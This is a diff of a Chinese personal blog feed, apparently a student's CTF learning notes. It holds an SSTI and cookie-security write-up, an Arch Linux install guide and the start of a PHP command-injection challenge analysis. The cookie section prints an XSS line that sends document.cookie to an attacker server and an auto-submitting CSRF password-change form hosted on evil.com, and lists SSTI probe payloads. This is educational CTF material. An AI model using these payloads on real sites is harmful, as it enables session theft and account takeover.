class="line">        if &quot;&#125;&quot; in result:</span><br><span class="line">            print(result)</span><br><span class="line">            num = 1</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>得到flag  </p>
+<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>做了一道BUUCTF题，接触了许多新的知识点。在这里记录一下<br>题目在这：</p>
+<blockquote>
+<p>👉 <a href="https://buuoj.cn/challenges#[BJDCTF2020]Cookie%20is%20so%20stable">BJDCTF2020 题目链接</a></p>
 </blockquote>
-<h2 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h2><h3 id="设置主机名-1"><a href="#设置主机名-1" class="headerlink" title="设置主机名"></a>设置主机名</h3><blockquote>
-<p>1.nano &#x2F;etc&#x2F;hostname  </p>
+<h2 id="1-SSTI"><a href="#1-SSTI" class="headerlink" title="1.SSTI"></a>1.SSTI</h2><p>SSTI是这道题所考察的知识点，所以写在最前面  </p>
+<h3 id="如何判断是SSTI"><a href="#如何判断是SSTI" class="headerlink" title="如何判断是SSTI"></a>如何判断是SSTI</h3><p>众所周知，SSTI是利用服务器模板漏洞，在模板引擎中注入恶意代码来进行攻击。<br>所以我们可以通过输入一些特殊的“探针”，观察服务器响应的变化来判断是否存在SSTI<br>常见的SSTI探针：</p>
+
+    {{7*7}}               # Jinja2, Nunjucks, Twig等
+    ${7*7}                # JSP, Freemarker, Spring
+    <%= 7 * 7 %>          # EJS (Embedded JavaScript)
+    #{7*7}                # Thymeleaf
+
+<p>我们可以在输入框、URL参数、HTTP头、Cookies等位置尝试输入这些探针。然后查看页面返回里有没有49，如果有49，说明这里执行成功了，则存在SSTI漏洞  </p>
+<p>不同的模板中使用不同的注入格式</p>
+<ul>
+<li><strong>Jinja2 和 Twig</strong>: 使用 <code>&#123;&#123; &#125;&#125;</code></li>
+<li><strong>Freemarker 和 Spring</strong>: 使用 <code>$&#123; &#125;</code></li>
+<li><strong>EJS</strong>: 使用 <code>&lt;%= %&gt;</code></li>
+<li><strong>Thymeleaf</strong>: 使用 <code>#&#123; &#125;</code><br>有时候会对大括号之类的进行过滤，所以可以用Unicode进行绕过</li>
+</ul>
+<blockquote>
+<p>👉 <a href="https://forum.butian.net/share/1371">SSTI 利用的文章</a></p>
 </blockquote>
-<h3 id="设置-root-密码"><a href="#设置-root-密码" class="headerlink" title="设置 root 密码"></a>设置 root 密码</h3><blockquote>
-<p>1.passwd  </p>
-</blockquote>
-<h3 id="设置普通用户"><a href="#设置普通用户" class="headerlink" title="设置普通用户"></a>设置普通用户</h3><blockquote>
-<p>1.useradd -m -G wheel [用户名]  </p>
-</blockquote>
-<h3 id="为用户创建密码"><a href="#为用户创建密码" class="headerlink" title="为用户创建密码"></a>为用户创建密码</h3><blockquote>
-<p>1.passwd [用户名]  </p>
-</blockquote>
-<h3 id="编辑-sudoers-赋予用户-root-权限"><a href="#编辑-sudoers-赋予用户-root-权限" class="headerlink" title="编辑 sudoers 赋予用户 root 权限"></a>编辑 sudoers 赋予用户 root 权限</h3><blockquote>
-<p>1.nano &#x2F;etc&#x2F;sudoers {删除 %wheel ALL&#x3D;(ALL:ALL) ALL前的“#”}  </p>
-</blockquote>
-<h2 id="启用服务"><a href="#启用服务" class="headerlink" title="启用服务"></a>启用服务</h2><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><blockquote>
-<p>1.systemctl enable NetworkManager  </p>
-</blockquote>
-<h3 id="蓝牙"><a href="#蓝牙" class="headerlink" title="蓝牙"></a>蓝牙</h3><blockquote>
-<p>1.systemctl enable bluetooth </p>
-</blockquote>
-<h2 id="编辑-grub"><a href="#编辑-grub" class="headerlink" title="编辑 grub"></a>编辑 grub</h2><h3 id="编辑-grub-1"><a href="#编辑-grub-1" class="headerlink" title="编辑 grub"></a>编辑 grub</h3><blockquote>
-<p>1.nano &#x2F;etc&#x2F;default&#x2F;grub {去掉 GRUB_DISABLE_OS_PROBER&#x3D;false 前的“#”}  </p>
-</blockquote>
-<h3 id="安装-grub-服务"><a href="#安装-grub-服务" class="headerlink" title="安装 grub 服务"></a>安装 grub 服务</h3><pre><code>1.grub-install --target=x86_64-efi --efi-directory=/efi --bootloader-id=grub  
-2.grub-mkconfig -o /boot/grub/grub.cfg (更新 grub 向导)  
+<h2 id="2-这道题提示查看Cookie，看看能从Cookie中突破的还有什么？"><a href="#2-这道题提示查看Cookie，看看能从Cookie中突破的还有什么？" class="headerlink" title="2.这道题提示查看Cookie，看看能从Cookie中突破的还有什么？"></a>2.这道题提示查看Cookie，看看能从Cookie中突破的还有什么？</h2><p>Cookie可以从以下方面入手<br>1.HttpOnly、Secure、SameSite 标志：如果Cookie没有设置这些标志，可能可以通过XSS攻击窃取Cookie。<br>2.弱JWT签名：如果JWT使用弱的对称加密密钥（如 secret）或无签名 (none algorithm)，可以直接伪造JWT。<br>3.客户端验证：CTF中常见的“role&#x3D;guest”→“role&#x3D;admin”权限提升。<br>4.会话固定 (Session Fixation)：如果你能控制Session ID，可能可以冒充管理员。  </p>
+<p>这里详细写一下第一点和第二点  </p>
+<p>一、HttpOnly、Secure、SameSite 标志<br>我们可以使用F12打开控制台，然后在应用程序 (Application)”→“存储 (Storage)”→“Cookies”中，检查Cookie的属性：</p>
+<pre><code>HttpOnly：如果未启用，可能可以通过XSS攻击来窃取Cookie。
+Secure：如果未启用，可能会在HTTP而不是HTTPS上传输Cookie。
+SameSite：如果为None，可能可用于CSRF攻击。  
 </code></pre>
-<h1 id="安装KDE"><a href="#安装KDE" class="headerlink" title="安装KDE"></a>安装KDE</h1><blockquote>
-<p>sudo pacman -S plasma  </p>
-</blockquote>
-<h2 id="开机自启显示管理"><a href="#开机自启显示管理" class="headerlink" title="开机自启显示管理"></a>开机自启显示管理</h2><blockquote>
-<p>systemctl enable sddm  </p>
-</blockquote>
-<h2 id="其他安装"><a href="#其他安装" class="headerlink" title="其他安装"></a>其他安装</h2><blockquote>
-<p>pacman -S konsole ark dolphin kate </p>
-</blockquote>
-<h1 id="完成安装"><a href="#完成安装" class="headerlink" title="完成安装"></a>完成安装</h1><h2 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h2><blockquote>
-<p>exit </p>
-</blockquote>
-<h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><blockquote>
-<p>reboot </p>
-</blockquote>
-<h1 id="进入系统"><a href="#进入系统" class="headerlink" title="进入系统"></a>进入系统</h1><p><code>alt + Ctrl + T 打开终端</code>  </p>
-<h2 id="更新-grub"><a href="#更新-grub" class="headerlink" title="更新 grub"></a>更新 grub</h2><blockquote>
-<p>sudo grub-mkconfig -o &#x2F;boot&#x2F;grub&#x2F;grub.cfg  </p>
-</blockquote>
-<h2 id="安装中文字体"><a href="#安装中文字体" class="headerlink" title="安装中文字体"></a>安装中文字体</h2><blockquote>
-<p>sudo pacman -S adobe-source-han-sans-cn-fonts  </p>
-</blockquote>
-<p>设置语言后重启  </p>
-<h2 id="配置国内源"><a href="#配置国内源" class="headerlink" title="配置国内源"></a>配置国内源</h2><h3 id="配置国内源-1"><a href="#配置国内源-1" class="headerlink" title="配置国内源"></a>配置国内源</h3><pre><code>sudo nano /etc/pacman.conf
-开启32位库，&#123;去掉 [multilib]及下一行前的 &quot;#&quot;&#125;  
-然后在下面添加：
-Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch  (清华源)或
-Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch           (科大源)或  
-Server = https://repo.huaweicloud.com/archlinux/$repo/os/$srch   (华为源)  
-</code></pre>
-<h3 id="刷新软件包"><a href="#刷新软件包" class="headerlink" title="刷新软件包"></a>刷新软件包</h3><blockquote>
-<p>sudo pacman -Syy  </p>
-</blockquote>
-<h3 id="导入密钥"><a href="#导入密钥" class="headerlink" title="导入密钥"></a>导入密钥</h3><blockquote>
-<p>sudo pacman -S archlinuxcn-keyring  </p>
-</blockquote>
-<h2 id="软件商店软件源安装（可选）"><a href="#软件商店软件源安装（可选）" class="headerlink" title="软件商店软件源安装（可选）"></a>软件商店软件源安装（可选）</h2><blockquote>
-<p>sudo pacman -S archlinux-appstream-data packagekit-qt6 fwupd  </p>
-</blockquote>
-<h2 id="安装-aur-助手-yay"><a href="#安装-aur-助手-yay" class="headerlink" title="安装 aur 助手 yay"></a>安装 aur 助手 yay</h2><pre><code>sudo pacman -S yay
-yay -Syy
-</code></pre>
-<h2 id="安装中文输入法参照-ArchWiKi"><a href="#安装中文输入法参照-ArchWiKi" class="headerlink" title="安装中文输入法参照 ArchWiKi"></a>安装中文输入法参照 ArchWiKi</h2><p>推荐Fcitx5 </p>
-<h1 id="yay"><a href="#yay" class="headerlink" title="yay"></a>yay</h1><h2 id="使用-Yay-进行包管理"><a href="#使用-Yay-进行包管理" class="headerlink" title="使用 Yay 进行包管理"></a>使用 Yay 进行包管理</h2><p>Yay 遵循与 pacman 类似（但不相同）的命令结构。所以你用 Yay 管理 AUR 包应该不难。</p>
-<p>搜索软件包：</p>
-<pre><code>yay search_term
-</code></pre>
-<p>安装软件包：</p>
-<pre><code>yay -S package_name
-</code></pre>
-<p>删除软件包：</p>
-<pre><code>yay -R package_name
-</code></pre>
-<p>要删除包及其依赖项：</p>
-<pre><code>yay -Rns package_name
-</code></pre>
-<p>仅升级 AUR 包：</p>
-<pre><code>yay -Sua
-</code></pre>
-<p>Yay 还能够升级非 AUR 软件包。上面的 a 标志将其限制为 AUR。  </p>
-<h2 id="将-Yay-升级到新版本"><a href="#将-Yay-升级到新版本" class="headerlink" title="将 Yay 升级到新版本"></a>将 Yay 升级到新版本</h2><p>现在，你可能想知道如何将 Yay 升级到可用的新版本。</p>
-<p>答案是你不需要做任何特别的事情。当你运行以下命令时，Yay 可以自行更新：</p>
-<pre><code>yay -Sua  
-</code></pre>
+<h4 id="1-利用-HttpOnly"><a href="#1-利用-HttpOnly" class="headerlink" title="1. 利用 HttpOnly"></a>1. 利用 HttpOnly</h4><p>开启HttpOnly则禁止通过JavaScript访问Cookie  如果这里是关的，那就可以  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;fetch(&#x27;http://yourserver.com/steal?cookie=&#x27; + document.cookie);&lt;/script&gt;    </span><br></pre></td></tr></table></figure>
+<p>通过钓鱼的方式来获取管理员的会话ID  </p>
+<h4 id="2-利用未设置-Secure-的-Cookie"><a href="#2-利用未设置-Secure-的-Cookie" class="headerlink" title="2. 利用未设置 Secure 的 Cookie"></a>2. 利用未设置 Secure 的 Cookie</h4><p>使用Burp Suite或Wireshark进行抓包。<br>在HTTP请求中，寻找Cookie: PHPSESSID&#x3D;xxxx。<br>如果会话ID出现在HTTP请求中，而不是HTTPS中，则可以劫持会话。<br>如果题目考察是中间人攻击 (MITM)，你可以使用Wireshark来捕获Cookie：<br>过滤器：http.cookie。<br>查找“Set-Cookie”或“Cookie”字段中的会话ID。 </p>
+<h4 id="3-利用不安全的-SameSite-属性"><a href="#3-利用不安全的-SameSite-属性" class="headerlink" title="3. 利用不安全的 SameSite 属性"></a>3. 利用不安全的 SameSite 属性</h4><p>如果SameSite标志为None，则跨站请求可以携带会话ID。<br>这使得CSRF攻击成为可能。<br>在攻击者的网站（比如 http:&#x2F; &#x2F;evil.com）上放置以下表单：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;http ://victim.com/change_password.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;newpassword123&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>如果受害者访问evil. com，表单会在受害者的会话中自动提交。</p>
+<p>如果SameSite&#x3D;None，浏览器会将受害者的会话ID (PHPSESSID) 自动携带到请求中，管理员的身份将被利用。</p>
 ]]></content>
       <tags>
-        <tag>Linux</tag>
+        <tag>周报</tag>
       </tags>
   </entry>
   <entry>
@@ -1292,6 +1035,466 @@ print(deserialized_data)
 <li><strong>可调用对象</strong>是 Python 的核心概念之一，包括函数、类、方法和实现了 <code>__call__</code> 的实例。</li>
 <li>使用 <code>callable()</code> 可以快速检测对象是否可调用。</li>
 <li>理解 callable 是掌握装饰器、动态编程和回调机制的关键。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>周报</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>archlinux</title>
+    <url>/posts/49ae7cb9/</url>
+    <content><![CDATA[<h1 id="安装了下arch双系统，真不好安啊，现把所有需要用到的代码写在这"><a href="#安装了下arch双系统，真不好安啊，现把所有需要用到的代码写在这" class="headerlink" title="安装了下arch双系统，真不好安啊，现把所有需要用到的代码写在这"></a>安装了下arch双系统，真不好安啊，现把所有需要用到的代码写在这</h1><h2 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a>前期准备：</h2><pre><code>1.制作好系统盘，在制作系统盘时需注意分区类型使用GPT，然后在主板关闭安全启动  
+2开机时使用U盘启动 
+</code></pre>
+<h2 id="无线网卡连接网络（有线可以略过）"><a href="#无线网卡连接网络（有线可以略过）" class="headerlink" title="无线网卡连接网络（有线可以略过）"></a>无线网卡连接网络（有线可以略过）</h2><pre><code>1.iwctl 
+2.device list (列出所有WIFI设备) 
+3.station [网卡名称] scan (扫描网络)  
+4.station [网卡名称] get-networks (显示所有网络)  
+5.station [网卡名称] connect [WIFI名称] 
+输入密码
+Ctrl  + d 退出  
+ping一下看看是否连接到网络  （ping www.baidu.com）  
+</code></pre>
+<h2 id="连上网后，更新系统时间"><a href="#连上网后，更新系统时间" class="headerlink" title="连上网后，更新系统时间"></a>连上网后，更新系统时间</h2><blockquote>
+<p>1.timedatectl (更新系统时间)  </p>
+</blockquote>
+<h2 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h2><h3 id="分区-1"><a href="#分区-1" class="headerlink" title="分区"></a>分区</h3><pre><code>1.fdisk -l (查看自己分区)  
+找到我们要安装的硬盘，单 nvme 盘为 /dev/nvme0n1;单 sata 盘为 /dev/sda1  
+2.cfdisk + [你的硬盘] 
+3.Type 选择第一个 efi system  
+4.Write 
+5.选中分出来的空间，选择 new，创建根分区，输入分区大小（不小于22G）
+5.选中剩下的空余空间，选择new ，创建 home 分区，输入分区大小  
+6.选中剩下的空余空间，选择 new ,创建 swap 交换空间 （类似于 win 的虚拟内存）  
+7.Sort 排下序  
+8.选中 home 分区，Type 选择 linux home  
+9.选中 swap 分区，Type 选择 linux swap  
+10.Write 写入
+11.Quit 退出  
+12.再次执行 fdisk -l 看看是否分好  
+</code></pre>
+<h3 id="格式化分区"><a href="#格式化分区" class="headerlink" title="格式化分区"></a>格式化分区</h3><pre><code>1.mkfs.[文件系统] （-f）/dev/[分区编号]
+例： mkfs.btrfs -f /dev/nvme0n1p4 
+    mkfs.ext4 /dev/nvme0n1p4  
+2.mkfs.btrfs -f /dev/nvme0n1p5 (格式化 home 分区)  
+3.mkswap /dev/nvme0n1p6 (初始化swap分区)  
+</code></pre>
+<h3 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h3><pre><code>一定要先挂载根分区  
+1.mount /dev/[根分区编号] /mnt  
+例：mount /dev/nvme0n1p4 /mnt  
+2.mount --mkdir /dev/[home分区编号] /mnt/home （挂载根分区）
+3.mount --mkdir /dev/[efi分区编号] /mnt/efi  （挂载efi分区）  
+例：mount --mkdir /dev/nvme0n1p1 /mnt/efi  
+4.swapon /dev/[交换空间分区编号] （挂载交换分区）  
+</code></pre>
+<h2 id="配置国内镜像源"><a href="#配置国内镜像源" class="headerlink" title="配置国内镜像源"></a>配置国内镜像源</h2><pre><code>1.nano /etc/pacman.d/mirrorlist  
+2.在第一行添加
+Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch  
+3.Ctrl + o 保存
+4.Ctrl + x 退出  
+5.pacman -Syy (刷新)  
+6.pacman -S archlinux-keyring (重新安装密钥)  
+</code></pre>
+<h2 id="安装基本系统"><a href="#安装基本系统" class="headerlink" title="安装基本系统"></a>安装基本系统</h2><pre><code>1.pacstrap /mnt [软件包]  
+base （基础系统），base-devel (工具包) 
+</code></pre>
+<p>例：</p>
+<pre><code>pacstrap /mnt base base-devel linux-zen linux-zen-headers linux-firmware networkmanager grub os-prober efibootmgr ntfs-3g amd-ucode bluez bluez-utils nano  
+</code></pre>
+<p>一路回车就可以  </p>
+<h2 id="创建-fstab-自动挂载配置文件"><a href="#创建-fstab-自动挂载配置文件" class="headerlink" title="创建 fstab (自动挂载配置文件)"></a>创建 fstab (自动挂载配置文件)</h2><blockquote>
+<p>1.genfstab -U &#x2F;mnt &gt;&gt; &#x2F;mnt&#x2F;etc&#x2F;fstab  </p>
+</blockquote>
+<h2 id="chroot进入系统"><a href="#chroot进入系统" class="headerlink" title="chroot进入系统"></a>chroot进入系统</h2><blockquote>
+<p>1.arch-chroot &#x2F;mnt </p>
+</blockquote>
+<h2 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h2><h3 id="设置时区-1"><a href="#设置时区-1" class="headerlink" title="设置时区"></a>设置时区</h3><blockquote>
+<p>1.ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime  </p>
+</blockquote>
+<h3 id="设置硬件时间"><a href="#设置硬件时间" class="headerlink" title="设置硬件时间"></a>设置硬件时间</h3><blockquote>
+<p>1.hwclock –systohc </p>
+</blockquote>
+<h2 id="本地化"><a href="#本地化" class="headerlink" title="本地化"></a>本地化</h2><h3 id="编辑locale-gen"><a href="#编辑locale-gen" class="headerlink" title="编辑locale.gen"></a>编辑locale.gen</h3><pre><code>1.nano /etc/locale.gen &#123;删除 en_US.UTF-8 UTF-8 和 zh_CN.UTF-8 UTF-8 前的&quot;#&quot;&#125; 
+2.locale-gen (生成locale)  
+</code></pre>
+<h3 id="编辑locale-conf"><a href="#编辑locale-conf" class="headerlink" title="编辑locale.conf:"></a>编辑locale.conf:</h3><blockquote>
+<p>1.nano &#x2F;etc&#x2F;locale.conf  {添加 LANG&#x3D;en_US.UTF-8}  </p>
+</blockquote>
+<h2 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h2><h3 id="设置主机名-1"><a href="#设置主机名-1" class="headerlink" title="设置主机名"></a>设置主机名</h3><blockquote>
+<p>1.nano &#x2F;etc&#x2F;hostname  </p>
+</blockquote>
+<h3 id="设置-root-密码"><a href="#设置-root-密码" class="headerlink" title="设置 root 密码"></a>设置 root 密码</h3><blockquote>
+<p>1.passwd  </p>
+</blockquote>
+<h3 id="设置普通用户"><a href="#设置普通用户" class="headerlink" title="设置普通用户"></a>设置普通用户</h3><blockquote>
+<p>1.useradd -m -G wheel [用户名]  </p>
+</blockquote>
+<h3 id="为用户创建密码"><a href="#为用户创建密码" class="headerlink" title="为用户创建密码"></a>为用户创建密码</h3><blockquote>
+<p>1.passwd [用户名]  </p>
+</blockquote>
+<h3 id="编辑-sudoers-赋予用户-root-权限"><a href="#编辑-sudoers-赋予用户-root-权限" class="headerlink" title="编辑 sudoers 赋予用户 root 权限"></a>编辑 sudoers 赋予用户 root 权限</h3><blockquote>
+<p>1.nano &#x2F;etc&#x2F;sudoers {删除 %wheel ALL&#x3D;(ALL:ALL) ALL前的“#”}  </p>
+</blockquote>
+<h2 id="启用服务"><a href="#启用服务" class="headerlink" title="启用服务"></a>启用服务</h2><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><blockquote>
+<p>1.systemctl enable NetworkManager  </p>
+</blockquote>
+<h3 id="蓝牙"><a href="#蓝牙" class="headerlink" title="蓝牙"></a>蓝牙</h3><blockquote>
+<p>1.systemctl enable bluetooth </p>
+</blockquote>
+<h2 id="编辑-grub"><a href="#编辑-grub" class="headerlink" title="编辑 grub"></a>编辑 grub</h2><h3 id="编辑-grub-1"><a href="#编辑-grub-1" class="headerlink" title="编辑 grub"></a>编辑 grub</h3><blockquote>
+<p>1.nano &#x2F;etc&#x2F;default&#x2F;grub {去掉 GRUB_DISABLE_OS_PROBER&#x3D;false 前的“#”}  </p>
+</blockquote>
+<h3 id="安装-grub-服务"><a href="#安装-grub-服务" class="headerlink" title="安装 grub 服务"></a>安装 grub 服务</h3><pre><code>1.grub-install --target=x86_64-efi --efi-directory=/efi --bootloader-id=grub  
+2.grub-mkconfig -o /boot/grub/grub.cfg (更新 grub 向导)  
+</code></pre>
+<h1 id="安装KDE"><a href="#安装KDE" class="headerlink" title="安装KDE"></a>安装KDE</h1><blockquote>
+<p>sudo pacman -S plasma  </p>
+</blockquote>
+<h2 id="开机自启显示管理"><a href="#开机自启显示管理" class="headerlink" title="开机自启显示管理"></a>开机自启显示管理</h2><blockquote>
+<p>systemctl enable sddm  </p>
+</blockquote>
+<h2 id="其他安装"><a href="#其他安装" class="headerlink" title="其他安装"></a>其他安装</h2><blockquote>
+<p>pacman -S konsole ark dolphin kate </p>
+</blockquote>
+<h1 id="完成安装"><a href="#完成安装" class="headerlink" title="完成安装"></a>完成安装</h1><h2 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h2><blockquote>
+<p>exit </p>
+</blockquote>
+<h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><blockquote>
+<p>reboot </p>
+</blockquote>
+<h1 id="进入系统"><a href="#进入系统" class="headerlink" title="进入系统"></a>进入系统</h1><p><code>alt + Ctrl + T 打开终端</code>  </p>
+<h2 id="更新-grub"><a href="#更新-grub" class="headerlink" title="更新 grub"></a>更新 grub</h2><blockquote>
+<p>sudo grub-mkconfig -o &#x2F;boot&#x2F;grub&#x2F;grub.cfg  </p>
+</blockquote>
+<h2 id="安装中文字体"><a href="#安装中文字体" class="headerlink" title="安装中文字体"></a>安装中文字体</h2><blockquote>
+<p>sudo pacman -S adobe-source-han-sans-cn-fonts  </p>
+</blockquote>
+<p>设置语言后重启  </p>
+<h2 id="配置国内源"><a href="#配置国内源" class="headerlink" title="配置国内源"></a>配置国内源</h2><h3 id="配置国内源-1"><a href="#配置国内源-1" class="headerlink" title="配置国内源"></a>配置国内源</h3><pre><code>sudo nano /etc/pacman.conf
+开启32位库，&#123;去掉 [multilib]及下一行前的 &quot;#&quot;&#125;  
+然后在下面添加：
+Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch  (清华源)或
+Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch           (科大源)或  
+Server = https://repo.huaweicloud.com/archlinux/$repo/os/$srch   (华为源)  
+</code></pre>
+<h3 id="刷新软件包"><a href="#刷新软件包" class="headerlink" title="刷新软件包"></a>刷新软件包</h3><blockquote>
+<p>sudo pacman -Syy  </p>
+</blockquote>
+<h3 id="导入密钥"><a href="#导入密钥" class="headerlink" title="导入密钥"></a>导入密钥</h3><blockquote>
+<p>sudo pacman -S archlinuxcn-keyring  </p>
+</blockquote>
+<h2 id="软件商店软件源安装（可选）"><a href="#软件商店软件源安装（可选）" class="headerlink" title="软件商店软件源安装（可选）"></a>软件商店软件源安装（可选）</h2><blockquote>
+<p>sudo pacman -S archlinux-appstream-data packagekit-qt6 fwupd  </p>
+</blockquote>
+<h2 id="安装-aur-助手-yay"><a href="#安装-aur-助手-yay" class="headerlink" title="安装 aur 助手 yay"></a>安装 aur 助手 yay</h2><pre><code>sudo pacman -S yay
+yay -Syy
+</code></pre>
+<h2 id="安装中文输入法参照-ArchWiKi"><a href="#安装中文输入法参照-ArchWiKi" class="headerlink" title="安装中文输入法参照 ArchWiKi"></a>安装中文输入法参照 ArchWiKi</h2><p>推荐Fcitx5 </p>
+<h1 id="yay"><a href="#yay" class="headerlink" title="yay"></a>yay</h1><h2 id="使用-Yay-进行包管理"><a href="#使用-Yay-进行包管理" class="headerlink" title="使用 Yay 进行包管理"></a>使用 Yay 进行包管理</h2><p>Yay 遵循与 pacman 类似（但不相同）的命令结构。所以你用 Yay 管理 AUR 包应该不难。</p>
+<p>搜索软件包：</p>
+<pre><code>yay search_term
+</code></pre>
+<p>安装软件包：</p>
+<pre><code>yay -S package_name
+</code></pre>
+<p>删除软件包：</p>
+<pre><code>yay -R package_name
+</code></pre>
+<p>要删除包及其依赖项：</p>
+<pre><code>yay -Rns package_name
+</code></pre>
+<p>仅升级 AUR 包：</p>
+<pre><code>yay -Sua
+</code></pre>
+<p>Yay 还能够升级非 AUR 软件包。上面的 a 标志将其限制为 AUR。  </p>
+<h2 id="将-Yay-升级到新版本"><a href="#将-Yay-升级到新版本" class="headerlink" title="将 Yay 升级到新版本"></a>将 Yay 升级到新版本</h2><p>现在，你可能想知道如何将 Yay 升级到可用的新版本。</p>
+<p>答案是你不需要做任何特别的事情。当你运行以下命令时，Yay 可以自行更新：</p>
+<pre><code>yay -Sua  
+</code></pre>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>从零开始的CTF冒险（一）！</title>
+    <url>/posts/6249b303/</url>
+    <content><![CDATA[<h1 id="以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。"><a href="#以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。" class="headerlink" title="以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。"></a>以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。</h1><h2 id="一、WEB学习目录"><a href="#一、WEB学习目录" class="headerlink" title="一、WEB学习目录"></a>一、WEB学习目录</h2><h3 id="工具篇："><a href="#工具篇：" class="headerlink" title="工具篇："></a>工具篇：</h3><p>WEB的常用工具有：<br>BurpSuite（一款常用的抓包工具，应用广泛，文件上传必不可少的利器）<br>Hackerbar（浏览器插件，传参的好帮手）<br>蚁剑（连接工具）<br>还有许许多多的部署在Linux上的工具，……这里的东西就以后再来探索吧（）<br>###<br>拥有了入门的工具，就可以步入WEB的世界力（喜）</p>
+<h3 id="WEB包括哪些内容："><a href="#WEB包括哪些内容：" class="headerlink" title="WEB包括哪些内容："></a>WEB包括哪些内容：</h3><p>1.文件包含<br>2.文件上传</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RCE，XSS</title>
+    <url>/posts/4d9b8a15/</url>
+    <content><![CDATA[<h1 id="PHP-RCE"><a href="#PHP-RCE" class="headerlink" title="PHP RCE"></a>PHP RCE</h1><h2 id="记录一道关于PHP函数漏洞利用的题目"><a href="#记录一道关于PHP函数漏洞利用的题目" class="headerlink" title="记录一道关于PHP函数漏洞利用的题目"></a>记录一道关于PHP函数漏洞利用的题目</h2><blockquote>
+<p><a href="https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool">题目在这里</a>  </p>
+</blockquote>
+<p>创建实例显示源代码如下：  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>进行代码审计，我们发现</p>
+<p>只要传入host参数，就会进入else逻辑,其中存在mkdir命令和chdir命令。</p>
+<pre><code>mkdir命令是确保sandbox存在，不存在就创建一个
+chair命令是进入到sandbox目录去
+</code></pre>
+<p><em>$sandbox &#x3D; md5(“glzjin”. $_SERVER[‘REMOTE_ADDR’]);<em>会将</em>glzjin</em>与<em>REMOTE_ADDR</em>中存储的数据进行MD5运算</p>
+<p>注意到最后一行中出现system()函数进行命令执行，因此我们可以尝试依次作为我们RCE的入手点。 </p>
+<p>其中的 <em>nmap -T5 -sT -Pn –host-timeout 2 -F</em>命令是对$host指定的主机的端口进行扫描</p>
+<p>接下来看看从哪里触发system()函数</p>
+<p>注意到程序中存在escapehsellarg()函数和escapeshellcmd()函数，看看他们可以实现什么样的功能？</p>
+<blockquote>
+<p><a href="http://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/">读这里了解更多</a></p>
+</blockquote>
+<blockquote>
+<p><a href="https://paper.seebug.org/164/">还有这里</a></p>
+</blockquote>
+<p>查阅资料我们发现，在PHP中，为了避免用户输入中的RCE风险，官方在5.2.18以上版本中加入了escapeshellarg()函数用于防止注入参数。其功能为：把字符串转码为可以在 shell 命令里使用的参数。</p>
+<p>原理是：</p>
+<pre><code>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保
+能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。
+</code></pre>
